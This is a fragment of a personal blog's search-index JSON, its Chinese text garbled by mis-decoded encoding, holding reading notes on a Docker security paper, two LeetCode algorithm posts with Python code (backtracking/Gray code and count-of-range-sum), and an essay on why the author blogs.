","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:2:0","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#2å†…å®¹æ¦‚æ‹¬"},{"categories":null,"content":"3.æ–‡ç« å„éƒ¨åˆ†å¤è¿° ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:3:0","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#3æ–‡ç« å„éƒ¨åˆ†å¤è¿°"},{"categories":null,"content":"æ‘˜è¦ ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:3:1","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#æ‘˜è¦"},{"categories":null,"content":"1.ä»‹ç» è¯´æ˜äº†è™šæ‹ŸåŒ–æŠ€æœ¯çš„ä½¿ç”¨åœºæ™¯å’Œæ„ä¹‰ã€‚ ç„¶åå‘Šè¯‰ä½ è™šæ‹ŸåŒ–æŠ€æœ¯å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼Œä¸€ç±»æ˜¯åŸºäºå®¹å™¨çš„è™šæ‹ŸåŒ–æŠ€æœ¯ï¼ˆæ¯”å¦‚Dockerï¼‰ï¼Œä¸€ç±»æ˜¯åŸºäºç›‘ç®¡ç¨‹åºï¼ˆè™šæ‹Ÿæœºï¼‰ã€‚ ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:3:2","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#1ä»‹ç»"},{"categories":null,"content":"2.è™šæ‹ŸåŒ–æ–¹æ³•åˆ†æ ä»‹ç»ä¸¤ç§è™šæ‹ŸåŒ–æŠ€æœ¯ã€‚ åŸºäºå®¹å™¨ï¼š æ“ä½œç³»ç»Ÿå±‚é¢ æ›´åŠ è½»é‡çº§ã€èŠ‚çº¦èµ„æº å®‰å…¨é£é™©æ›´é«˜ åŸºäºç›‘ç®¡ç¨‹åº ç¡¬ä»¶å±‚é¢ æ‰€éœ€èµ„æºæ›´å¤š å®‰å…¨æ€§æ›´é«˜ ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:3:3","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#2è™šæ‹ŸåŒ–æ–¹æ³•åˆ†æ"},{"categories":null,"content":"3.Docker Overview å‘Šè¯‰ä½ Dockerçš„ä¼˜ç‚¹ï¼Œè½»é‡çº§ã€é€‚ç”¨å¤šå¹³å°ã€ç”¨æˆ·å‹å¥½ã€å¯¹ç¬¬ä¸‰æ–¹å·¥å…·æ”¯æŒè¾ƒå¥½ç­‰â€¦ ç„¶åä¸»è¦ä»‹ç»äº†Dockerä¸­çš„é•œåƒæ¦‚å¿µã€‚ å¤šå±‚æ–‡ä»¶ç³»ç»Ÿ ä¿®æ”¹é•œåƒâ€”â€”å†™æ—¶å¤åˆ¶ ä»¥åŠDockerä½¿ç”¨namespaceå’Œcgroupsï¼Œæ¥ä¸ºå®¹å™¨æä¾›å®‰å…¨æ€§ã€‚æˆ‘è§‰å¾—éœ€è¦ç†è§£æŒæ¡çš„æ˜¯namespaceæœºåˆ¶ã€‚ Linuxä¸­çš„namespaceæœºåˆ¶ï¼Œç±»ä¼¼äºC++ä¸­çš„namespaceæ€æƒ³ã€‚è¿™ä¸€æœºåˆ¶å°†æ‰€æœ‰èµ„æºæ ¹æ®ä¸åŒçš„å‘½åç©ºé—´åˆ’åˆ†ä¸ºä¸åŒçš„æŠ½è±¡æ•´ä½“ã€‚å¤„äºåŒä¸€namespaceä¸­çš„è¿›ç¨‹å¯ä»¥çœ‹åˆ°å¯¹æ–¹ï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°è¯¥å‘½åç©ºé—´ä¸‹çš„èµ„æºåŠå…¶å˜åŒ–æƒ…å†µã€‚ æ–‡ç« ä¸­è¯´ç›®å‰ï¼ˆ2015å¹´ï¼‰Dockerä½¿ç”¨5ç§namespaceï¼Œä½†æ˜¯ç°åœ¨å·²ç»æ˜¯6ç§ï¼Œåˆ†åˆ«ä¸ºï¼š ç§ç±» å«ä¹‰ UTS ä¸»æœºå’ŒåŸŸå IPC ä¿¡å·é‡ã€æ¶ˆæ¯é˜Ÿåˆ—å’Œå…±äº«å†…å®¹ PID è¿›ç¨‹ç¼–å· network ç½‘ç»œè®¾å¤‡ã€ç½‘ç»œæ ˆã€ç«¯å£ç­‰ mount æŒ‚è½½ç‚¹(æ–‡ä»¶ç³»ç»Ÿ) user ç”¨æˆ·å’Œç”¨æˆ·ç»„ ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:3:4","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#3docker-overview"},{"categories":null,"content":"4.Dockerå®‰å…¨åˆ†æ è¿™ä¸€éƒ¨åˆ†å†…å®¹ï¼Œé¦–å…ˆæŒ‡å‡ºä¸€ä¸ªæ“ä½œç³»ç»Ÿå±‚é¢çš„è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå¦‚æœè¦ä¿æŒå®‰å…¨ï¼Œé‚£ä¹ˆåº”è¯¥æ»¡è¶³6ç‚¹ï¼š è¿›ç¨‹éš”ç¦» æ–‡ä»¶ç³»ç»Ÿéš”ç¦» è®¾å¤‡éš”ç¦» è¿›ç¨‹é—´é€šä¿¡éš”ç¦» ç½‘ç»œéš”ç¦» åˆ†é…èµ„æºçš„é™åˆ¶ å…¶å®è¿™äº›å’Œä¹‹å‰æåˆ°çš„namespaceçš„å†…å®¹å¾ˆç›¸åƒï¼Œç„¶åæ–‡ç« å¼€å§‹åˆ†æDockerå¦‚ä½•æ»¡è¶³è¿™äº›éœ€æ±‚ã€‚å…¶å®å°±æ˜¯ä½¿ç”¨å¯¹åº”ç±»å‹çš„namespaceæ¥å®ç°ä¸åŒç±»å‹èµ„æºçš„éš”ç¦»ã€‚ä¸è¿‡åœ¨è¯´æ˜ç½‘ç»œèµ„æºéš”ç¦»çš„æ—¶å€™ï¼Œå› ä¸ºé»˜è®¤æƒ…å†µä¸‹ï¼Œå®¿ä¸»æœºçš„è™šæ‹Ÿç½‘å¡docker0ä¼šè½¬å‘æ‰€æœ‰çš„æ•°æ®åŒ…ï¼Œæ‰€ä»¥å¯èƒ½å­˜åœ¨ARPæ¬ºéª—å’Œæ³›æ´ªæ”»å‡»çš„é£é™©ï¼Œä¸è¿‡åœ¨åé¢çš„å†…å®¹ä¸­ï¼Œæ–‡ç« ä¹Ÿè¯´æ˜å¯ä»¥é€šè¿‡åœ¨å®¿ä¸»æœºä¸ºè™šæ‹Ÿç½‘å¡è®¾ç½®è½¬å‘è¿‡æ»¤è§„åˆ™æ¥å‡å°‘æˆ–é¿å…è¿™ä¸€é£é™©ã€‚ æ¥ä¸‹æ¥æ–‡ç« åˆ†æäº†Dockerä¸å®¿ä¸»æœºä¹‹é—´çš„å®‰å…¨é—®é¢˜ã€‚ é¦–å…ˆä»‹ç»äº†Linuxä¸­çš„capabilityæ¦‚å¿µã€‚åœ¨ä»¥å‰çš„Linuxç‰ˆæœ¬ä¸­ï¼Œå†…æ ¸å°†è¿›ç¨‹åˆ†ä¸ºæ™®é€šå’Œrootçº§åˆ«ï¼Œrootçº§åˆ«çš„è¿›ç¨‹æ‹¥æœ‰æ‰€æœ‰æƒé™ã€‚æ˜¾ç„¶è¿™ç§æ–¹å¼æ˜¯å­˜åœ¨é£é™©çš„ã€‚capabilityå°±æ˜¯å¯¹äºæƒé™çš„æ›´åŠ ç»†ç²’åº¦çš„åˆ’åˆ†ã€‚Linuxä¸­æœ‰å¾ˆå¤šä¸ªcapabilityï¼Œæ¯ä¸ªcapabilityå¯¹åº”ä¸€ä¸ªç‰¹æ®Šçš„æƒé™ã€‚ Dockeré»˜è®¤å…³é—­äº†å¾ˆå¤šcapabilityï¼Œæ¥ç¡®ä¿å®¹å™¨ä¸å®¿ä¸»æœºä¹‹é—´çš„å®‰å…¨ã€‚ æ¥ä¸‹æ¥æ–‡ç« ä»‹ç»äº†AppArmorå’ŒSELinuxè¿™ä¸¤ç§Linuxå®‰å…¨æ¨¡å—ã€‚ ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:3:5","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#4dockerå®‰å…¨åˆ†æ"},{"categories":null,"content":"5.è®¨è®ºä¸æ€»ç»“ ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:3:6","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#5è®¨è®ºä¸æ€»ç»“"},{"categories":null,"content":"4.ä¸ªäººæ€»ç»“ è¿™ç¯‡æ–‡ç« æ˜¯å¯¹Dockerå®‰å…¨çš„æ€»ä½“åˆ†æï¼Œä»‹ç»äº†ä¸€äº›Dockerå®‰å…¨ç›¸å…³çš„åŸºç¡€æ¦‚å¿µï¼Œæ¯”å¦‚namespaceã€capabilityã€‚å› ä¸ºæ˜¯æ€»ä½“æ€§çš„æ¦‚è¿°ç±»æ–‡ç« ï¼Œæ‰€ä»¥å†…å®¹å¹¶ä¸å¤šï¼Œä¸€ä¸ªä¸‹åˆçš„æ—¶é—´è¶³å¤Ÿçœ‹å®Œå¹¶ä¸”å†™å‡ºè¿™æ ·ä¸€ç¯‡æ€»ç»“ã€‚ ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:4:0","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#4ä¸ªäººæ€»ç»“"},{"categories":null,"content":"å‚è€ƒèµ„æ–™ Linux namespaceè¯¦è§£ namespaces(7) â€” Linux manual page ä½¿ç”¨cloneå‡½æ•° å¤šç§namespaceç¤ºä¾‹ ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:5:0","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#å‚è€ƒèµ„æ–™"},{"categories":["ç®—æ³•"],"content":"å›æº¯ç®—æ³•æ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼Œç›¸ä¿¡å¤§å®¶éƒ½å¬è¯´è¿‡å›æº¯ç®—æ³•ï¼Œä½†æ˜¯å›æº¯ç®—æ³•çš„åŸç†æ˜¯ä»€ä¹ˆå‘¢ï¼Œä¸€èˆ¬å¦‚ä½•ç”¨ä»£ç å®ç°å‘¢ï¼Ÿ å›æº¯ç®—æ³•ï¼Œå°±æ˜¯å°†æ¯æ¡è·¯éƒ½èµ°ä¸€éï¼Œå½“åˆ°è¾¾æ­£ç¡®çš„ç»“æœæ—¶ï¼Œåœæ­¢æˆ–è€…ç»§ç»­å°è¯•ä»è€Œè·å¾—æ‰€æœ‰çš„æ­£ç¡®ç»“æœ åˆ·äº†Leetcodeä¸Š20+é“å…³äºå›æº¯ç®—æ³•çš„é¢˜ä¹‹åï¼Œæ„Ÿè§‰è‡ªå·±å¯¹äºå›æº¯ç®—æ³•æœ‰äº†ä¸€ç‚¹ç‚¹(å°å£°bb)è®¤è¯†ï¼Œç‰¹æ­¤è®°å½•å¹¶åŠ æ·±è‡ªå·±çš„å°è±¡ã€‚ æœ‰å›¾ä¸ºè¯æœ‰å›¾ä¸ºè¯ \" æœ‰å›¾ä¸ºè¯ å›æº¯ç®—æ³•ä¸€èˆ¬æ˜¯é€šè¿‡é€’å½’çš„å½¢å¼æ¥å®ç°çš„ã€‚å›æº¯çš„æ–¹å¼ï¼ŒæŒ‰ç…§å›æº¯çš„ç›®çš„å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼Œä¸¤ç§ç±»å‹çš„å›æº¯ç•¥æœ‰å·®åˆ«ï¼Œä½†æ˜¯æœ¬è´¨éƒ½ä¸€æ ·ã€‚ ç¬¬ä¸€ç±»ï¼šæ‰¾å‡ºä¸€ä¸ªåˆé€‚çš„ç»“æœ ç¬¬äºŒç±»ï¼šæ‰¾å‡ºæ‰€æœ‰åˆé€‚çš„ç»“æœ äº†è§£å›æº¯ç®—æ³•ï¼Œé¦–å…ˆéœ€è¦æ‰¾å‡ºè¿›è¡Œéå†çš„å†³ç­–æ ‘ã€‚æƒ³è±¡è‡ªå·±ä½äºä¸€ä¸ªèµ·ç‚¹ï¼Œåœ¨ä½ é¢å‰æœ‰å¾ˆå¤šä¸ªè·¯å£ï¼Œæ¯ä¸ªè·¯å£å¾€å‰èµ°å¯èƒ½åˆä¼šæœ‰å¤šä¸ªè·¯å£ï¼Œæœ€åæœ‰ä¸€æ¡è·¯å£å¯¹åº”çš„è·¯çš„å°½å¤´æœ‰ä½ æƒ³è¦çš„ä¸œè¥¿ï¼Œä½ éœ€è¦æ‰¾åˆ°ä½ çš„ç›®æ ‡ï¼Œæ‰€æœ‰è·¯å£ç»„æˆçš„æ‰€æœ‰è·¯å¾„ï¼Œå°±æ˜¯ä¸€ä¸ªå†³ç­–æ ‘ã€‚äºæ˜¯ï¼Œè§£å†³å›æº¯ç±»å‹çš„ç®—æ³•é¢˜ï¼Œé¦–å…ˆéœ€è¦å°†å†³ç­–æ ‘ï¼Œä¹Ÿå°±æ˜¯å¤šä¸ªè·¯å£ç»„æˆçš„è·¯å¾„æ ‘æ‰¾å‡ºæ¥ã€‚æ¯”å¦‚åœ¨åˆ†å‰²å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œæ¯ä¸ªé—´éš”å¯ä»¥é€‰æ‹©åˆ†å‰²æˆ–è€…ä¸åˆ†å‰²ï¼Œè¿™æ ·å°±æ„æˆäº†ä¸€ä¸ªæ¯ä¸ªç‚¹æœ‰ä¸¤ä¸ªè·¯å£çš„å†³ç­–è·¯å¾„æ ‘ã€‚ åœ¨æå–å‡ºäº†è¿™ä¸€æ¦‚å¿µä¹‹åï¼Œå¯ä»¥å¼€å§‹ç¼–å†™å›æº¯çš„é€’å½’å‡½æ•°ã€‚ å¯¹äºç¬¬ä¸€ç±»çš„å›æº¯ï¼Œé€’å½’å‡½æ•°çš„æ¨¡æ¿ä¸€èˆ¬å¦‚ä¸‹ï¼š def backtrack(path, ...): if æ»¡è¶³ç»ˆæ­¢æ¡ä»¶: res = path return True result = False # resultå˜é‡å¾ˆå…³é”®ï¼Œresultä¸ºTrueè¯´æ˜å·²ç»æ‰¾åˆ°äº†ï¼Œä»è€Œä¸éœ€è¦è¿›è¡Œä¹‹åçš„å°è¯•ï¼Œä½¿é€’å½’èƒ½å¤Ÿæ­£ç¡®ç»“æŸ for é€‰æ‹© in å€™é€‰åˆ—è¡¨: path.append(é€‰æ‹©) # åšå‡ºé€‰æ‹© if backtrack(newpath, ...): result = True break path.pop(é€‰æ‹©) # æ’¤é”€è¿™ä¸€æ¬¡é€‰æ‹© return result å¯¹äºç¬¬äºŒç±»çš„å›æº¯é—®é¢˜ï¼Œéœ€è¦æ‰¾å‡ºæ‰€æœ‰åˆé€‚çš„è·¯å¾„ï¼Œæ‰€ä»¥é€’å½’å‡½æ•°ä¸€èˆ¬ä¸è¿”å›å€¼ def backtrack(path, ...): if æ»¡è¶³ç»ˆæ­¢æ¡ä»¶: if path not in res: res.append(path) for é€‰æ‹© in å€™é€‰åˆ—è¡¨: path.append(é€‰æ‹©) # åšå‡ºé€‰æ‹© backtrack(newpath, ...): path.pop(é€‰æ‹©) # æ’¤é”€è¿™ä¸€æ¬¡é€‰æ‹© å¯¹äºä»¥ä¸Šçš„å‡½æ•°æ¨¡æ¿ï¼Œé€šå¸¸ç»ˆæ­¢æ¡ä»¶ä¸pathæˆ–è€…pathä¹‹åçš„å‚æ•°æœ‰å…³(æ¯”å¦‚å­—ç¬¦ä¸²ç´¢å¼•ç­‰)ï¼Œè€Œå€™é€‰åˆ—è¡¨ä¸€èˆ¬ç”±pathä¹‹åçš„å‚æ•°å†³å®šã€‚pathè®°å½•çš„å°±æ˜¯å½“å‰åšå‡ºçš„æ‰€æœ‰é€‰æ‹©ï¼Œresä¸­appendçš„å€¼ä¹Ÿä¸ä¸€å®šæ˜¯pathï¼Œä½†æ˜¯ä¸€èˆ¬éƒ½å¯ä»¥ç”±pathè¿™ä¸€å˜é‡å¾—åˆ°ã€‚ å›æº¯ç®—æ³•é™¤äº†èƒ½å¤Ÿæ­£ç¡®å¾—åˆ°ç»“æœä¹‹å¤–ï¼Œæœ‰çš„æ—¶å€™ä¸ºäº†è§£å†³è¶…æ—¶è¿™ä¸€é—®é¢˜ï¼Œè¿˜éœ€è¦å¯¹degwré€‰æ‹©è¿›è¡Œè¿‡æ»¤ï¼Œæˆ–è€…é‡‡ç”¨æ›´é«˜çº§çš„æ–¹å¼è¿›è¡Œå‰ªæã€‚ æœ€åï¼Œæ”¾ä¸€ä¸‹è‡ªå·±ç‹¬ç«‹å®Œæˆçš„Leetcode 89é¢˜â€”â€”æ ¼é›·ç çš„å›æº¯ç®—æ³•ä»£ç ã€‚ from typing import List class Solution: def grayCode(self, n: int) -\u003e List[int]: ''' å›æº¯ç®—æ³• ''' visited = [0] total = int(pow(2, n)) # å¯¹äºresultå˜é‡çš„åˆ›å»ºå’Œèµ‹å€¼å¾ˆå…³é”®ï¼Œå®ƒå½±å“äº†ä¹‹åçš„æ‰§è¡Œæµ def backtrack(num: int, count: int): # å¦‚æœæ»¡è¶³ç»“æŸæ¡ä»¶ if count == total: return True result = False for i in range(n): tmp = 0 if (num \u003e\u003e i) \u0026 1: tmp = num - pow(2, i) else: tmp = num + pow(2, i) if tmp in visited: continue visited.append(tmp) if backtrack(tmp, count+1): result = True break visited.pop() return result backtrack(0, 1) return visited if __name__ == \"__main__\": s = Solution() print(s.grayCode(4)) ","date":"2020-11-13","objectID":"/2020-11-13-%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95%E7%90%86%E8%A7%A3/:0:0","series":null,"tags":["Python3","Algorithm"],"title":"å›æº¯ç®—æ³•ç†è§£","uri":"/2020-11-13-%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95%E7%90%86%E8%A7%A3/#"},{"categories":["ç®—æ³•"],"content":"Leetcode 327é¢˜ è®¡ç®—æ•°ç»„åŒºé—´å’Œçš„æ—¶å€™ï¼Œç»å¸¸ç”¨åˆ°å‰ç¼€å’Œè¿™ä¸€æ€æƒ³ã€‚æ¯”å¦‚è¿™é¢˜ã€‚ åœ¨çœ‹å®˜æ–¹é¢˜è§£çš„ç¬¬ä¸€ç§æ–¹æ³•æ—¶ï¼Œæˆ‘æ— æ³•ç†è§£ä¸ºä½•å¯ä»¥åœ¨å¯¹å‰ç¼€å’Œæ•°ç»„è¿›è¡Œå½’å¹¶æ’åºçš„è¿‡ç¨‹ä¸­ï¼Œè®¡ç®—ç¬¦åˆæ¡ä»¶çš„åŒºé—´æ•°ç›®ã€‚å†çœ‹å‡ éæ‰æ‡‚ï¼Œå½“æŠŠå·¦å³ä¸¤ä¸ªå·²ç»æ’å¥½åºçš„æ•°ç»„è¿›è¡Œå½’å¹¶çš„æ—¶å€™ï¼Œå› ä¸ºå·¦å³çš„ä½ç½®åŸå› ï¼Œæ‰€ä»¥å¯ä»¥ä¿è¯å³è¾¹æ•°ç»„ä¸­çš„å…ƒç´ å‡å»å·¦è¾¹æ•°ç»„ä¸­çš„å…ƒç´ æ‰€å¾—åˆ°çš„ç»“æœï¼Œä¼šæ˜¯ä¸€ä¸ªåˆæ³•çš„åŒºé—´å’Œæ•°æ®ã€‚å†åˆ©ç”¨å½’å¹¶çš„é€’å½’æ€æƒ³ï¼Œå°±å¯ä»¥å¾—åˆ°æƒ³è¦çš„ç»“æœã€‚ pythonä»£ç å¦‚ä¸‹ï¼š # æœ€å®¹æ˜“ç†è§£çš„æ€è·¯ï¼šå‰ç¼€å’Œ class Solution: def countRangeSum(self, nums: List[int], lower: int, upper: int) -\u003e int: def countRec(lower: int, upper: int, left: int, right: int) -\u003e int: if left == right: return 0 # n1 n2 åˆ†åˆ«ä»£è¡¨å·¦åŠè¾¹å’Œå³åŠè¾¹å‰ç¼€å’Œæ•°ç»„ä¸­å­˜åœ¨çš„ç¬¦åˆæ¡ä»¶çš„ä¸‹æ ‡å¯¹æ•° n1 = countRec(lower, upper, left, (left+right)//2) n2 = countRec(lower, upper, (left+right)//2+1, right) res = n1+n2 # æ¥ä¸‹æ¥è®¡ç®—ä¸€ä¸ªä¸‹æ ‡åœ¨å·¦æ•°ç»„ï¼Œä¸€ä¸ªä¸‹æ ‡åœ¨å³æ•°ç»„çš„å¯¹æ•° i = left L = R = (left+right)//2+1 # ç§»åŠ¨Lä¸R while i \u003c= (left+right)//2: while L\u003c=right and sums[L]-sums[i] \u003c lower: L+=1 while R\u003c=right and sums[R]-sums[i] \u003c= upper: R+=1 res += (R-L) i += 1 # ä¸ºäº†ä¿è¯å·¦å³æ•°ç»„çš„æœ‰åºæ€§ï¼Œéœ€è¦åœ¨è¿™é‡Œè¿›è¡Œå½’å¹¶æ’åº # åˆ›å»ºä¸´æ—¶æ•°ç»„ sortedNums = [] p1 = left p2 = (left+right)//2+1 while p1 \u003c= (left+right)//2 or p2 \u003c= right: if p1 \u003e (left+right)//2: while p2 \u003c= right: sortedNums.append(sums[p2]) p2+=1 elif p2 \u003e right: while p1 \u003c= (left+right)//2: sortedNums.append(sums[p1]) p1+=1 else: if sums[p1] \u003c sums[p2]: sortedNums.append(sums[p1]) p1+=1 else: sortedNums.append(sums[p2]) p2+=1 # ä¿®æ”¹å¾…æ’åºæ•°ç»„ for i in range(len(sortedNums)): sums[left+i] = sortedNums[i] return res # é¦–å…ˆè®¡ç®—å‰ç¼€å’Œæ•°ç»„ sums = [0] for item in nums: sums.append(sums[-1]+item) return countRec(lower, upper, 0, len(nums)) ","date":"2020-11-07","objectID":"/2020-11-07-leetcode-327-count-of-range-sum/:0:0","series":null,"tags":["Leetcode","Python3","å½’å¹¶"],"title":"Leetcode 327 count-of-range-sum","uri":"/2020-11-07-leetcode-327-count-of-range-sum/#"},{"categories":["æ–‡å­—"],"content":" è·¯æ¼«æ¼«å…¶ä¿®è¿œå…®ï¼Œå¾å°†ä¸Šä¸‹è€Œæ±‚ç´¢ ","date":"2020-11-03","objectID":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/:0:0","series":null,"tags":["Life","Blog"],"title":"ä¸ºä»€ä¹ˆæƒ³è¦å†™åšå®¢","uri":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/#"},{"categories":["æ–‡å­—"],"content":"è‡ªæˆ‘è®¤è¯† æˆ‘è‡ªè®¤ä¸ºæ˜¯ä¸€ä¸ªæ¯”è¾ƒæ‡’æ•£çš„äººï¼Œä¸å¤Ÿå‹¤å¥‹åˆ»è‹¦ã€‚ä¹…è€Œä¹…ä¹‹ï¼Œæ€æƒ³ä¹Ÿå®¹æ˜“å˜å¾—æ‡’æ•£èµ·æ¥ï¼Œä¸“æ³¨åº¦ä¸å¤Ÿé«˜ã€‚ æ‰€ä»¥ï¼Œæˆ‘è®¤ä¸ºè‡ªå·±éœ€è¦æ”¹å˜ã€‚å½“ç„¶ï¼Œè¿™ä¸ªâ€œæ”¹å˜â€ä¸å¯èƒ½æ˜¯ä¸€å¤œä¹‹é—´å°±èƒ½å®ç°çš„ï¼Œè€Œæ˜¯é€æ¸è°ƒæ•´è‡ªå·±çš„ä¸ªäººä¹ æƒ¯ï¼Œé€šè¿‡é•¿ä¹…çš„æ‰“ç£¨ï¼Œä½¿å¾—è‡ªå·±çš„ä¸€äº›æ€æƒ³è¢«æ›¿æ¢ï¼Œä»è€Œåšäº‹æ›´åŠ é«˜æ•ˆï¼Œè¿™ä¹Ÿç®—æ˜¯è‡ªæˆ‘æ„‰æ‚¦çš„ä¸€ç§æ–¹å¼å§ã€‚ ","date":"2020-11-03","objectID":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/:1:0","series":null,"tags":["Life","Blog"],"title":"ä¸ºä»€ä¹ˆæƒ³è¦å†™åšå®¢","uri":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/#è‡ªæˆ‘è®¤è¯†"},{"categories":["æ–‡å­—"],"content":"ä¸ºä»€ä¹ˆè¦å†™åšå®¢ ","date":"2020-11-03","objectID":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/:2:0","series":null,"tags":["Life","Blog"],"title":"ä¸ºä»€ä¹ˆæƒ³è¦å†™åšå®¢","uri":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/#ä¸ºä»€ä¹ˆè¦å†™åšå®¢"},{"categories":["æ–‡å­—"],"content":"å…³äºå†™ä½œ å†™ä½œç¡®å®æ˜¯ä¸€ä»¶éå¸¸ç‰¹åˆ«çš„äº‹ã€‚è™½ç„¶æˆ‘ä»å°å°±ä¸å–œæ¬¢å†™ä½œæ–‡ï¼Œä½†é‚£æ˜¯å¯¹äºåº”è¯•æ•™è‚²çš„æ¯ç‡¥ä»»åŠ¡è€Œè¨€çš„(æˆ‘ç°åœ¨ä»ç„¶å¾ˆè®¨åŒè¢«ä»–äººä¸‹ä»»åŠ¡è¦æ±‚å†™ä¸€ç¯‡æ–‡ç« )ã€‚åº”è¯•æ•™è‚²çš„ä½œæ–‡ä»»åŠ¡åŠå…¶æ¯ç‡¥ä¹å‘³ï¼Œå› ä¸ºåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®ƒæ˜¯ä¸€ç§å¤–åŠ›å¼ºè¿«çš„è¡Œä¸ºï¼Œè€Œæˆ‘è®¤ä¸ºï¼Œå†™ä½œåº”è¯¥æ˜¯å‘è‡ªå†…å¿ƒçš„ã€‚ä¸€ä¸ªäººéœ€è¦è¡¨è¾¾è‡ªå·±å†…å¿ƒçš„ä¸€äº›æƒ³æ³•ï¼Œä»è€Œå°†å…¶è½¬å˜ä¸ºå¯ä»¥çœ‹è§çš„æ–‡å­—ï¼Œè¿™å°±æ˜¯ä¸€ç§éå¸¸åˆé€‚çš„æ–¹å¼ï¼Œå†™ä½œè¿‡ç¨‹ä¸­çš„æ€è€ƒå¯¹äºä¸ªäººçš„æˆé•¿è€Œè¨€ä¹Ÿæ˜¯éå¸¸æœ‰ä»·å€¼çš„ã€‚ æ— è®ºä¸€ä¸ªäººæ–‡å­¦ç´ å…»å¦‚ä½•ã€æ–‡é‡‡å¦‚ä½•ï¼Œåœ¨å®‰å®‰é™é™å†™å­—çš„è¿‡ç¨‹ä¸­ï¼Œä»–æ€»èƒ½å¤Ÿè·å¾—å¿«ä¹çš„ã€‚ ","date":"2020-11-03","objectID":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/:2:1","series":null,"tags":["Life","Blog"],"title":"ä¸ºä»€ä¹ˆæƒ³è¦å†™åšå®¢","uri":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/#å…³äºå†™ä½œ"},{"categories":["æ–‡å­—"],"content":"åšå®¢çš„ç›®çš„ ç›®çš„ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š æé«˜æ–‡å­—åŠŸåº• å°†ä¸€äº›äº‹æƒ…ç”¨æ–‡å­—è¡¨è¾¾å‡ºæ¥ï¼Œå¹¶ä¸”è®©å¤§å¤šæ•°é˜…è¯»è€…åœ¨é˜…è¯»çš„è¿‡ç¨‹ä¸­éƒ½æ„Ÿè§‰èˆ’æœ(feel comfortable)ï¼Œæ˜¯ä¸€ç§éå¸¸å€¼å¾—éª„å‚²çš„èƒ½åŠ›ã€‚ä¸è¿‡ç°åœ¨çš„æˆ‘è‚¯å®šæ˜¯æ²¡æœ‰çš„ :( å½’çº³æ€»ç»“åæ€ï¼š æ¯éš”ä¸€æ®µæ—¶é—´è¿›è¡Œæ€»ç»“å½’çº³ï¼Œæ˜¯éå¸¸å¥½çš„ä¸€ä¸ªä¹ æƒ¯ åŸ¹å…»å¿ƒæ€§ä¸ä¹ æƒ¯ é€šè¿‡ä½¿è‡ªå·±ä¸“æ³¨äºç å­—ï¼Œå°†å†…å¿ƒæƒ³æ³•æ…¢æ…¢åœ°è¿‡ä¸€éï¼ŒæŠ›å»æµ®èºï¼Œæ²‰æ·€è‡ªæˆ‘ 